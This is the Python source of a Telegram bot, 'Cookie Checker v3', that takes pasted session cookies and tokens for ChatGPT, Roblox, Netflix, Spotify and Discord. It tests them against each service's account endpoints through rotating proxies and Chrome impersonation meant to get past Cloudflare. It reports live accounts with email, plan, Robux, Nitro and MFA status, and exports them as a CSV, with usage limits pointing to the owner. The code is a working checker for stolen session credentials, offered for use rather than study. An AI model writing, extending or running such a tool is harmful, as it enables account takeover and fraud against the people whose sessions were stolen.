import os
import re
import io
import csv
import json
import time
import random
import hashlib
import html as html_lib
import asyncio
import logging
from dataclasses import dataclass, field
from datetime import datetime
from typing import Optional

import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile, Message
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters

try:
    from curl_cffi.requests import AsyncSession as CurlSession
    HAS_CURL = True
except ImportError:
    HAS_CURL = False

# ── Config ──────────────────────────────────────────────────────────────────
BOT_TOKEN = os.environ["BOT_TOKEN"]
ADMIN_IDS = {int(x) for x in os.environ.get("ADMIN_IDS", "").split(",") if x.strip().isdigit()}
FREE_LIMIT = int(os.environ.get("FREE_LIMIT", "100"))

logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s", level=logging.INFO)
logger = logging.getLogger("cookie-bot")

# ── Proxy store (same as before) ────────────────────────────────────────────
USER_PROXIES: dict[int, list[str]] = {}
AWAITING_PROXY: dict[int, bool] = {}
PROXY_INDEX: dict[int, int] = {}

def next_proxy(chat_id: int) -> Optional[str]:
    pool = USER_PROXIES.get(chat_id, [])
    if not pool:
        return None
    idx = PROXY_INDEX.get(chat_id, 0) % len(pool)
    PROXY_INDEX[chat_id] = idx + 1
    return pool[idx]

# ── Stats ───────────────────────────────────────────────────────────────────
@dataclass
class Stats:
    checked: int = 0
    alive: int = 0
    dead: int = 0
    blocked: int = 0
    started_at: float = field(default_factory=time.time)

STATS = Stats()
USER_COUNTS: dict[int, int] = {}

# ── Proxy validation (same) ─────────────────────────────────────────────────
async def validate_proxy(proxy_url: str, timeout: int = 8) -> dict:
    proxy_url = proxy_url.strip()
    if not proxy_url.startswith(("http://", "https://", "socks5://", "socks4://")):
        proxy_url = "http://" + proxy_url
    start = time.perf_counter()
    try:
        if proxy_url.startswith("socks"):
            try:
                from aiohttp_socks import ProxyConnector
            except ImportError:
                return {"proxy": proxy_url, "ok": False, "ms": 0, "error": "aiohttp-socks missing"}
            connector = ProxyConnector.from_url(proxy_url)
            async with aiohttp.ClientSession(connector=connector) as s:
                async with s.get("https://httpbin.org/ip", timeout=aiohttp.ClientTimeout(total=timeout)) as r:
                    body = await r.text()
                    ok = r.status == 200 and "origin" in body
                    return {"proxy": proxy_url, "ok": ok, "ms": int((time.perf_counter() - start) * 1000),
                            "error": None if ok else f"HTTP {r.status}"}
        else:
            async with aiohttp.ClientSession() as s:
                async with s.get("https://httpbin.org/ip", proxy=proxy_url,
                                timeout=aiohttp.ClientTimeout(total=timeout)) as r:
                    body = await r.text()
                    ok = r.status == 200 and "origin" in body
                    return {"proxy": proxy_url, "ok": ok, "ms": int((time.perf_counter() - start) * 1000),
                            "error": None if ok else f"HTTP {r.status}"}
    except Exception as e:
        return {"proxy": proxy_url, "ok": False, "ms": int((time.perf_counter() - start) * 1000),
                "error": str(e)[:80]}

async def validate_proxies_bulk(proxies: list[str], concurrency: int = 5):
    sem = asyncio.Semaphore(concurrency)
    async def guarded(p):
        async with sem:
            return await validate_proxy(p)
    return await asyncio.gather(*[guarded(p) for p in proxies])

# ── HTTP helpers (proxy-aware) ──────────────────────────────────────────────
BROWSER_HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
}

async def aio_get(url: str, chat_id: int, headers: dict, cookies: dict = None, timeout: int = 15):
    proxy = next_proxy(chat_id)
    try:
        async with aiohttp.ClientSession() as s:
            kw = {}
            if proxy:
                if proxy.startswith("socks"):
                    from aiohttp_socks import ProxyConnector
                    connector = ProxyConnector.from_url(proxy)
                    async with aiohttp.ClientSession(connector=connector) as s2:
                        async with s2.get(url, headers={**BROWSER_HEADERS, **headers}, cookies=cookies,
                                         timeout=aiohttp.ClientTimeout(total=timeout), allow_redirects=False) as r:
                            text = await r.text()
                            data = json.loads(text) if text else None
                            return {"status": r.status, "data": data, "text": text[:600], "cf": r.headers.get("cf-mitigated"), "err": None}
                else:
                    kw["proxy"] = proxy
            async with s.get(url, headers={**BROWSER_HEADERS, **headers}, cookies=cookies,
                            timeout=aiohttp.ClientTimeout(total=timeout), allow_redirects=False, **kw) as r:
                text = await r.text()
                try:
                    data = json.loads(text) if text else None
                except Exception:
                    data = None
                return {"status": r.status, "data": data, "text": text[:600], "cf": r.headers.get("cf-mitigated"), "err": None}
    except Exception as e:
        return {"status": 0, "data": None, "text": "", "cf": None, "err": str(e)}

async def curl_get(url: str, chat_id: int, headers: dict, cookies: dict = None, timeout: int = 20):
    if not HAS_CURL:
        return {"status": 0, "data": None, "text": "", "cf": None, "err": "curl_cffi missing"}
    proxy = next_proxy(chat_id)
    try:
        async with CurlSession() as s:
            proxies = {"http": proxy, "https": proxy} if proxy else None
            r = await s.get(url, headers={**BROWSER_HEADERS, **headers}, cookies=cookies,
                            impersonate="chrome", proxies=proxies, timeout=timeout, allow_redirects=False)
            try:
                data = json.loads(r.text) if r.text else None
            except Exception:
                data = None
            return {"status": r.status_code, "data": data, "text": r.text[:600], "cf": r.headers.get("cf-mitigated"), "err": None}
    except Exception as e:
        return {"status": 0, "data": None, "text": "", "cf": None, "err": str(e)}

# ── Cookie parsing (same) ───────────────────────────────────────────────────
def parse_cookie_header(raw: str) -> dict:
    s = raw.strip()
    if s.lower().startswith("cookie:"):
        s = s[7:].strip()
    out = {}
    for part in s.split(";"):
        part = part.strip()
        if "=" in part:
            k, v = part.split("=", 1)
            out[k.strip()] = v.strip()
    return out

def extract(raw: str, *names: str) -> Optional[str]:
    jar = parse_cookie_header(raw)
    for n in names:
        if n in jar:
            return jar[n]
        chunks = []
        i = 0
        while f"{n}.{i}" in jar:
            chunks.append(jar[f"{n}.{i}"])
            i += 1
        if chunks:
            return "".join(chunks)
    if "=" not in raw and len(raw.strip()) > 20:
        return raw.strip()
    return None

def cookie_fingerprint(raw: str) -> str:
    return hashlib.sha256(raw.strip().encode()).hexdigest()[:16]

# ── Platform checkers (same endpoints, proxy-aware) ─────────────────────────
async def check_chatgpt(raw: str, chat_id: int) -> dict:
    token = extract(raw, "__Secure-next-auth.session-token")
    if not token:
        return {"platform": "ChatGPT", "alive": False, "reason": "cookie missing", "profile": {}}
    cookies = {"__Secure-next-auth.session-token": token}
    headers = {"Accept": "application/json", "Referer": "https://chatgpt.com/", "Origin": "https://chatgpt.com"}
    r = await curl_get("https://chatgpt.com/api/auth/session", chat_id, headers, cookies)
    if r["status"] == 200 and r["data"] and r["data"].get("user"):
        u = r["data"]["user"]
        return {"platform": "ChatGPT", "alive": True, "reason": "", "profile": {
            "email": u.get("email", "—"), "name": u.get("name", "—"),
            "plan": "Plus" if u.get("has_paid_subscription") else "Free",
        }}
    if r["cf"] or "cloudflare" in r["text"].lower():
        return {"platform": "ChatGPT", "alive": False, "reason": "Cloudflare blocked", "profile": {}}
    return {"platform": "ChatGPT", "alive": False, "reason": f"HTTP {r['status']} {r['err'] or ''}".strip(), "profile": {}}

async def check_roblox(raw: str, chat_id: int) -> dict:
    token = extract(raw, ".ROBLOSECURITY", "ROBLOSECURITY")
    if not token:
        return {"platform": "Roblox", "alive": False, "reason": "cookie missing", "profile": {}}
    cookies = {".ROBLOSECURITY": token}
    r = await aio_get("https://users.roblox.com/v1/users/authenticated", chat_id, {}, cookies)
    if r["status"] != 200 or not r["data"]:
        return {"platform": "Roblox", "alive": False, "reason": f"HTTP {r['status']}", "profile": {}}
    d = r["data"]
    uid = d.get("id")
    prof = {"username": d.get("name", "—"), "display": d.get("displayName", "—"), "id": uid}
    if uid:
        rb = await aio_get(f"https://economy.roblox.com/v1/users/{uid}/currency", chat_id, {}, cookies)
        if rb["status"] == 200 and rb["data"]:
            prof["robux"] = rb["data"].get("robux", 0)
        prem = await aio_get(f"https://premiumfeatures.roblox.com/v1/users/{uid}/validate-membership", chat_id, {}, cookies)
        prof["premium"] = prem["status"] == 200 and prem["data"] is True
    return {"platform": "Roblox", "alive": True, "reason": "", "profile": prof}

async def check_netflix(raw: str, chat_id: int) -> dict:
    nid = extract(raw, "NetflixId")
    sid = extract(raw, "SecureNetflixId")
    if not nid:
        return {"platform": "Netflix", "alive": False, "reason": "NetflixId missing", "profile": {}}
    cookies = {"NetflixId": nid}
    if sid:
        cookies["SecureNetflixId"] = sid
    r = await aio_get("https://www.netflix.com/accountowner/addextramember", chat_id, {}, cookies)
    if r["status"] == 200:
        text = r["text"].lower()
        plan = next((p for p in ["premium", "standard", "basic", "mobile"] if p in text), "unknown")
        return {"platform": "Netflix", "alive": True, "reason": "", "profile": {"plan": plan.title()}}
    if r["status"] in (301, 302):
        return {"platform": "Netflix", "alive": False, "reason": "redirect to login", "profile": {}}
    return {"platform": "Netflix", "alive": False, "reason": f"HTTP {r['status']}", "profile": {}}

async def check_spotify(raw: str, chat_id: int) -> dict:
    token = extract(raw, "sp_dc")
    if not token:
        return {"platform": "Spotify", "alive": False, "reason": "sp_dc missing", "profile": {}}
    cookies = {"sp_dc": token}
    r = await aio_get("https://open.spotify.com/get_access_token?reason=transport&productType=web_player", chat_id, {}, cookies)
    if r["status"] == 200 and r["data"]:
        d = r["data"]
        if d.get("isAnonymous"):
            return {"platform": "Spotify", "alive": False, "reason": "anonymous token", "profile": {}}
        return {"platform": "Spotify", "alive": True, "reason": "", "profile": {
            "premium": bool(d.get("isPremium")), "country": d.get("country", "—"),
        }}
    return {"platform": "Spotify", "alive": False, "reason": f"HTTP {r['status']}", "profile": {}}

async def check_discord(raw: str, chat_id: int) -> dict:
    token = extract(raw, "token", "__dcfduid")
    if not token:
        return {"platform": "Discord", "alive": False, "reason": "token missing", "profile": {}}
    headers = {"Authorization": token, "Accept": "application/json"}
    r = await curl_get("https://discord.com/api/v9/users/@me", chat_id, headers)
    if r["status"] == 200 and r["data"]:
        d = r["data"]
        return {"platform": "Discord", "alive": True, "reason": "", "profile": {
            "username": d.get("username", "—"), "email": d.get("email", "—"),
            "nitro": bool(d.get("premium_type", 0)), "mfa": d.get("mfa_enabled", False),
        }}
    if r["status"] == 403 and r["cf"]:
        return {"platform": "Discord", "alive": False, "reason": "Cloudflare blocked", "profile": {}}
    return {"platform": "Discord", "alive": False, "reason": f"HTTP {r['status']}", "profile": {}}

PLATFORMS = [
    ("ChatGPT", check_chatgpt, ("__Secure-next-auth.session-token",)),
    ("Roblox", check_roblox, (".ROBLOSECURITY", "ROBLOSECURITY")),
    ("Netflix", check_netflix, ("NetflixId",)),
    ("Spotify", check_spotify, ("sp_dc",)),
    ("Discord", check_discord, ("token", "__dcfduid")),
]

def detect_platform(raw: str):
    for name, fn, names in PLATFORMS:
        if extract(raw, *names):
            return name, fn
    if len(raw.strip()) > 20 and "=" not in raw:
        return "ChatGPT", check_chatgpt
    return None, None

# ── Concurrent checker ──────────────────────────────────────────────────────
async def check_one(raw: str, chat_id: int) -> dict:
    name, fn = detect_platform(raw)
    if not fn:
        return {"platform": "Unknown", "alive": False, "reason": "unrecognised cookie", "profile": {}}
    await asyncio.sleep(random.uniform(0.1, 0.3))
    try:
        return await fn(raw, chat_id)
    except Exception as e:
        return {"platform": name, "alive": False, "reason": f"error: {str(e)[:60]}", "profile": {}}

async def check_batch(lines: list[str], chat_id: int, concurrency: int = 6):
    seen, unique = set(), []
    for line in lines:
        fp = cookie_fingerprint(line)
        if fp not in seen:
            seen.add(fp)
            unique.append(line)
    sem = asyncio.Semaphore(concurrency)
    async def guarded(raw):
        async with sem:
            return await check_one(raw, chat_id)
    results = await asyncio.gather(*[guarded(u) for u in unique])
    return results, len(lines) - len(unique)

# ── Rich helpers ────────────────────────────────────────────────────────────
def esc(t):
    return html_lib.escape(str(t), quote=False)

def new_draft_id():
    return int(time.time() * 1000) % 2147483647 or 1

async def rich_send(context, chat_id, html, keyboard=None):
    kw = {"chat_id": chat_id, "rich_message": {"html": html}}
    if keyboard:
        kw["reply_markup"] = keyboard
    try:
        return await context.bot.do_api_request("sendRichMessage", kw, return_type=Message)
    except Exception:
        safe = re.sub(r"</?(?:h[1-6]|details|summary|table|tr|td|th|mark|hr|footer|ul|li)[^>]*>", "", html)
        try:
            return await context.bot.send_message(chat_id=chat_id, text=safe[:4000],
                                                  parse_mode=ParseMode.HTML, reply_markup=keyboard,
                                                  disable_web_page_preview=True)
        except Exception:
            plain = re.sub(r"<[^>]+>", "", html)
            return await context.bot.send_message(chat_id=chat_id, text=plain[:4000])

async def draft(context, chat_id, did, html):
    try:
        await context.bot.do_api_request("sendRichMessageDraft", {
            "chat_id": chat_id, "draft_id": did, "rich_message": {"html": html},
        })
    except Exception:
        pass

# ── Report ──────────────────────────────────────────────────────────────────
def build_report(results: list, dupes: int, elapsed: float, chat_id: int) -> str:
    alive = [r for r in results if r["alive"]]
    dead = [r for r in results if not r["alive"]]
    blocked = [r for r in dead if "proxy" in r["reason"].lower() or "cloudflare" in r["reason"].lower()]
    proxies = USER_PROXIES.get(chat_id, [])
    p = ["<h2>🍪 Cookie Check Report</h2>"]
    p.append("<table bordered striped>")
    p.append(f"<tr><td>Checked</td><td><b>{len(results)}</b></td></tr>")
    p.append(f"<tr><td>Valid</td><td><mark><b>{len(alive)}</b></mark></td></tr>")
    p.append(f"<tr><td>Invalid</td><td>{len(dead) - len(blocked)}</td></tr>")
    if blocked:
        p.append(f"<tr><td>Blocked (proxy/CF)</td><td>⚠️ {len(blocked)}</td></tr>")
    if dupes:
        p.append(f"<tr><td>Duplicates skipped</td><td>{dupes}</td></tr>")
    p.append(f"<tr><td>Time</td><td>{elapsed:.2f}s</td></tr>")
    p.append(f"<tr><td>Your proxies</td><td>{'✅ ' + str(len(proxies)) if proxies else '❌ none'}</td></tr>")
    p.append("</table><hr/>")
    if alive:
        p.append("<h3>✅ Valid Cookies</h3>")
        p.append("<details open><summary>Show working accounts</summary><ul>")
        for r in alive:
            parts = []
            for k, v in (r.get("profile") or {}).items():
                if v is True: v = "✅"
                elif v is False: v = "❌"
                elif v in ("", None, "—"): continue
                parts.append(f"{k}: {v}")
            p.append(f"<li><b>{esc(r['platform'])}</b> — <i>{esc(' · '.join(parts) or 'alive')}</i></li>")
        p.append("</ul></details><hr/>")
    if blocked:
        p.append("<h3>⚠️ Blocked (retry with proxy)</h3>")
        p.append("<details><summary>Show blocked cookies</summary><ul>")
        for r in blocked:
            p.append(f"<li><b>{esc(r['platform'])}</b> — <i>{esc(r['reason'])}</i></li>")
        p.append("</ul></details><hr/>")
    truly_dead = [r for r in dead if r not in blocked]
    if truly_dead:
        p.append("<h3>❌ Invalid Cookies</h3>")
        p.append("<details><summary>Show dead cookies</summary><ul>")
        for r in truly_dead:
            p.append(f"<li><b>{esc(r['platform'])}</b> — <i>{esc(r['reason'])}</i></li>")
        p.append("</ul></details>")
    p.append("<hr/><footer>")
    p.append(f"<i>{datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}</i> · "
             "<i>by <a href=\"https://t.me/arsh3\">@arsh3</a></i>")
    p.append("</footer>")
    return "\n".join(p)

# ── Handlers ────────────────────────────────────────────────────────────────
def main_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔌 Set Proxy", callback_data="set_proxy")],
        [InlineKeyboardButton("👨‍💻 Owner", url="https://t.me/arsh3")],
        [InlineKeyboardButton("📖 Docs", callback_data="help")],
    ])

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    proxies = USER_PROXIES.get(chat_id, [])
    html = (
        "<h2>🍪 Cookie Checker v3</h2>"
        "<p><i>Railway · polling mode · no webhook needed</i></p><hr/>"
        "<h3>Supported</h3><ul>"
        "<li><b>ChatGPT</b> — <code>__Secure-next-auth.session-token</code></li>"
        "<li><b>Roblox</b> — <code>.ROBLOSECURITY</code></li>"
        "<li><b>Netflix</b> — <code>NetflixId</code></li>"
        "<li><b>Spotify</b> — <code>sp_dc</code></li>"
        "<li><b>Discord</b> — token</li>"
        "</ul>"
        "<h3>Proxy Setup</h3>"
        "<p>Use <code>/setproxy</code> to paste your proxies. I will <b>validate them live</b> and only keep working ones.</p>"
        f"<p><b>Your proxies:</b> {'✅ ' + str(len(proxies)) + ' active' if proxies else '❌ none'}</p>"
        "<hr/><footer><b>Developer:</b> <a href=\"https://t.me/arsh3\">@arsh3</a></footer>"
    )
    await rich_send(context, chat_id, html, main_keyboard())

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await cmd_start(update, context)

async def help_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    await cmd_start(update, context)

async def cmd_setproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    AWAITING_PROXY[chat_id] = True
    await rich_send(context, chat_id,
        "<h3>🔌 Send your proxies</h3>"
        "<p>Paste one proxy per line.</p>"
        "<p>Supported: <code>http://user:pass@host:port</code>, <code>socks5://...</code></p>"
        "<p><i>I will validate them and save only the working ones.</i></p>")

async def cmd_myproxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    proxies = USER_PROXIES.get(chat_id, [])
    if not proxies:
        await rich_send(context, chat_id, "<p>No proxies set. Use /setproxy.</p>")
        return
    lines = ["<h3>🔌 Your Active Proxies</h3><ul>"]
    for p in proxies:
        lines.append(f"<li><code>{esc(p)}</code></li>")
    lines.append("</ul>")
    await rich_send(context, chat_id, "\n".join(lines))

async def cmd_clearproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    USER_PROXIES.pop(chat_id, None)
    PROXY_INDEX.pop(chat_id, None)
    await rich_send(context, chat_id, "<p>🗑️ Proxy pool cleared.</p>")

URL_RE = re.compile(r"https?://", re.I)

async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    uid = update.effective_user.id
    text = (update.message.text or "").strip()
    if not text:
        return

    if AWAITING_PROXY.get(chat_id):
        AWAITING_PROXY[chat_id] = False
        proxy_lines = [l.strip() for l in text.splitlines() if l.strip()]
        if not proxy_lines:
            await rich_send(context, chat_id, "<p>No proxies found.</p>")
            return
        await rich_send(context, chat_id, f"<h3>⏳ Validating {len(proxy_lines)} proxies…</h3>")
        results = await validate_proxies_bulk(proxy_lines)
        good = [r for r in results if r["ok"]]
        bad = [r for r in results if not r["ok"]]
        USER_PROXIES[chat_id] = [r["proxy"] for r in good]
        lines = [f"<h3>🔌 Proxy Validation</h3>", f"<p><b>{len(good)}</b> working · <b>{len(bad)}</b> failed</p>"]
        if good:
            lines.append("<details open><summary>✅ Working</summary><ul>")
            for r in good:
                lines.append(f"<li><code>{esc(r['proxy'])}</code> — {r['ms']}ms</li>")
            lines.append("</ul></details>")
        if bad:
            lines.append("<details><summary>❌ Failed</summary><ul>")
            for r in bad:
                lines.append(f"<li><code>{esc(r['proxy'])}</code> — <i>{esc(r['error'])}</i></li>")
            lines.append("</ul></details>")
        await rich_send(context, chat_id, "\n".join(lines))
        return

    lines = [l.strip() for l in text.splitlines() if l.strip() and not URL_RE.match(l)]
    if not lines:
        await rich_send(context, chat_id, "<blockquote>No cookies detected.</blockquote>")
        return

    if not ADMIN_IDS or uid not in ADMIN_IDS:
        used = USER_COUNTS.get(uid, 0)
        if used + len(lines) > FREE_LIMIT:
            await rich_send(context, chat_id,
                f"<blockquote>⚠️ Limit exceeded — {used}/{FREE_LIMIT} used. Contact @arsh3.</blockquote>")
            return

    did = new_draft_id()
    await draft(context, chat_id, did,
        f"<h2>⏳ Checking {len(lines)} cookie(s)…</h2><p><i>Polling mode · proxy-aware</i></p>")

    t0 = time.time()
    try:
        results, dupes = await check_batch(lines, chat_id)
    except Exception as exc:
        logger.exception("batch failed: %s", exc)
        await rich_send(context, chat_id, f"<blockquote>⚠️ Check failed: <code>{esc(exc)}</code></blockquote>")
        return
    elapsed = time.time() - t0

    STATS.checked += len(results)
    STATS.alive += sum(1 for r in results if r["alive"])
    STATS.dead += sum(1 for r in results if not r["alive"])
    STATS.blocked += sum(1 for r in results if not r["alive"] and ("proxy" in r["reason"].lower() or "cloudflare" in r["reason"].lower()))
    USER_COUNTS[uid] = USER_COUNTS.get(uid, 0) + len(lines)

    report = build_report(results, dupes, elapsed, chat_id)
    await rich_send(context, chat_id, report, main_keyboard())

    alive = [r for r in results if r["alive"]]
    if alive:
        ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        buf = io.StringIO()
        w = csv.writer(buf)
        w.writerow(["platform", "profile", "checked_at"])
        for r in alive:
            w.writerow([r["platform"], json.dumps(r.get("profile") or {}), datetime.utcnow().isoformat()])
        doc = InputFile(io.BytesIO(buf.getvalue().encode("utf-8")),
                        filename=f"valid_{ts}.csv", mime_type="text/csv")
        await context.bot.send_document(chat_id=chat_id, document=doc,
            caption=f"<b>{len(alive)}</b> valid cookies", parse_mode=ParseMode.HTML)

# ── Main — polling, not webhook ─────────────────────────────────────────────
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("setproxy", cmd_setproxy))
    app.add_handler(CommandHandler("myproxies", cmd_myproxies))
    app.add_handler(CommandHandler("clearproxy", cmd_clearproxy))
    app.add_handler(CallbackQueryHandler(help_cb, pattern="^help$"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_message))

    logger.info("Bot starting in polling mode…")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
